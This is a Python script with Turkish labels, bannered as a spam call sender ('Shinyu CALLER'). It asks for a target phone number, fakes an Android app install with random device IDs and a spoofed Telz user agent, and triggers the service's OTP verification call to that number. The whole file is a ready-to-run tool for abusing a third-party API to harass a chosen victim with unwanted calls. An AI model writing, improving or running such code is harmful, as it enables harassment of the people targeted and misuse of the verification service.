import time
import random
import string
import uuid
import json
import os

try:
    import pyfiglet
except ImportError:
    print("pyfiglet modülü bulunamadı. Yüklemek için: pip install pyfiglet")
    exit(1)

try:
    import requests
except ImportError:
    print("requests modülü bulunamadı. Yüklemek için: pip install requests")
    exit(1)

class CihazBilgisi: 
    @staticmethod
    def uret():
        zaman_damgasi = round(time.time() * 1000)
        cihaz_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        cihaz_uuid = str(uuid.uuid4())
        return zaman_damgasi, cihaz_id, cihaz_uuid

class ApiIstemi:
    def __init__(self, temel_basliklar):
        self.basliklar = temel_basliklar

    def gonder(self, adres, veri):
        try:
            yanit = requests.post(adres, data=veri, headers=self.basliklar, timeout=10)
            yanit_metni = yanit.text.lower()
            basarili = yanit.ok and ("ok" in yanit_metni or "success" in yanit_metni)
            return (basarili, yanit.text, yanit.status_code)
        except requests.exceptions.Timeout:
            return (False, "İstek zaman aşımına uğradı", 0)
        except requests.exceptions.ConnectionError:
            return (False, "Bağlantı hatası", 0)
        except Exception as e:
            return (False, str(e), 0)

class UygulamaKurucu:
    def __init__(self, telefon_numarasi, basliklar):
        self.telefon_numarasi = telefon_numarasi
        self.api_istemci = ApiIstemi(basliklar)
        self.kurulum_api = "https://api.telz.com/app/install"
        self.dogrulama_api = "https://api.telz.com/app/auth_call"

    def kur(self, tekrar_sayisi=3):
        ts, android_id, uid = CihazBilgisi.uret()
        kurulum_verisi = json.dumps({
            "android_id": android_id,
            "app_version": "17.5.17",
            "event": "install",
            "google_exists": "yes",
            "os": "android",
            "os_version": "9",
            "play_market": True,
            "ts": ts,
            "uuid": uid
        })
        
        print("\033[90m[1/2] Cihaz kurulumu yapılıyor...\033[0m")
        for deneme in range(tekrar_sayisi):
            basarili, yanit, kod = self.api_istemci.gonder(self.kurulum_api, kurulum_verisi)
            
            if deneme < tekrar_sayisi - 1 and not basarili:
                print(f"\033[90mKurulum ayarı {deneme + 1}/{tekrar_sayisi} başarısız, tekrar deneniyor...\033[0m")
                time.sleep(1)
                continue
            
            if basarili:
                print(f"\033[92m✓ Kurulum başarılı (Yanıt: {yanit[:50]}...)\033[0m")
                break
        
        if not basarili:
            return False, f"Kurulum başarısız: {yanit}", kod
        
        print("\033[90m[2/2] OTP çağrısı başlatılıyor...\033[0m")
        otp_basarili, otp_yanit, otp_kod = self.dogrula(ts, android_id, uid)
        
        if otp_basarili:
            print(f"\033[92m✓ Arama isteği gönderildi (Yanıt: {otp_yanit[:50]}...)\033[0m")
        else:
            print(f"\033[91m✗ Arama gönderilemedi (Yanıt: {otp_yanit[:100]})\033[0m")
        
        return otp_basarili, otp_yanit, otp_kod

    def dogrula(self, ts, android_id, uid):
        dogrulama_verisi = json.dumps({
            "android_id": android_id,
            "app_version": "17.5.17",
            "attempt": "0",
            "event": "auth_call",
            "lang": "ar",
            "os": "android",
            "os_version": "9",
            "phone": f"+{self.telefon_numarasi}",
            "ts": ts,
            "uuid": uid
        })
        basarili, yanit, kod = self.api_istemci.gonder(self.dogrulama_api, dogrulama_verisi)
        return basarili, yanit, kod

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = pyfiglet.figlet_format("Shinyu CALLER", font="slant")
    print("\033[96m" + banner + "\033[0m")
    print("\033[93m" + "="*60 + "\033[0m")
    print("\033[92m          Spam Arama Gönderici - luaxfy\033[0m")
    print("\033[92m          Spam Arama Gönderici - luaxfy\033[0m")
    print("\033[93m" + "="*60 + "\033[0m\n")

def main():
    print_banner()
    
    print("\033[96m📱 Hedef numarayı ülke kodu ile gir (örn: 905xxxxxxxxx):\033[0m")
    phone = input("\033[92m➤ \033[0m").strip().replace("+", "")
    
    if not phone.isdigit():
        print("\n\033[91m❌ Geçersiz telefon numarası! Sadece rakam kullan.\033[0m")
        print("\n\033[93m luaxfy\033[0m\n")
        return
    
    if len(phone) < 10:
        print("\n\033[91m❌ Telefon numarası çok kısa!\033[0m")
        print("\n\033[93m luaxfy\033[0m\n")
        return
    
    ua = {
        "User-Agent": "Telz-Android/17.5.17",
        "Content-Type": "application/json"
    }
    
    print(f"\n\033[93m⏳ OTP çağrısı gönderiliyor: +{phone}\033[0m")
    print("\033[90m" + "-"*60 + "\033[0m")
    
    kurucu = UygulamaKurucu(phone, ua)
    basarili, yanit, kod = kurucu.kur(tekrar_sayisi=3)
    
    print("\033[90m" + "-"*60 + "\033[0m")
    
    if basarili:
        print(f"\n\033[92m✅ +{phone} için OTP çağrısı başarıyla gönderildi!\033[0m")
        print(f"\033[90mHTTP Durum: {kod}\033[0m")
        print(f"\033[90mAPI Yanıtı: {yanit[:200] if len(yanit) > 200 else yanit}\033[0m")
    else:
        print(f"\n\033[91m❌ OTP çağrısı gönderilemedi!\033[0m")
        print(f"\033[90mHata Detayı: {yanit}\033[0m")
        if kod > 0:
            print(f"\033[90mHTTP Durum Kodu: {kod}\033[0m")
    
    print("\n\033[93m" + "="*60 + "\033[0m")
    print("\033[93m luaxfy \033[0m")
    print("\033[93m" + "="*60 + "\033[0m\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[91m❌ İşlem kullanıcı tarafından iptal edildi.\033[0m\n")
    except Exception as e:
        print(f"\n\033[91m❌ Hata oluştu: {str(e)}\033[0m\n")
